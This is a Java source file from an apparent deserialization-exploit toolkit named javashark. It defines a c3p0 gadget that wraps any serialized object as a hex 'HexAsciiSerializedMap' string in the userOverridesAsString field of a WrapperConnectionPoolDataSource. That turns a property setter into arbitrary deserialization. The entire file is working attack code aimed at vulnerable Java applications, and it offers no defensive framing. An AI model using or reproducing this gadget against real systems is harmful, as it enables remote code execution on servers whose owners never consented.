package dev.silente.javashark.gadget.c3p0;

import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;
import dev.silente.javashark.utils.MiscUtils;
import dev.silente.javashark.utils.ReflectUtils;
import dev.silente.javashark.utils.SerializeUtils;

public class GPoolDataSource {
    public static Object setter2Deserialize(Object o) throws Exception {
        WrapperConnectionPoolDataSource wcpds = new WrapperConnectionPoolDataSource();
        ReflectUtils.setFieldValue(wcpds,
                "userOverridesAsString",
                "HexAsciiSerializedMap:" + MiscUtils.bytes2HexString(SerializeUtils.serialize(o)) + ";");
        return wcpds;
    }
}
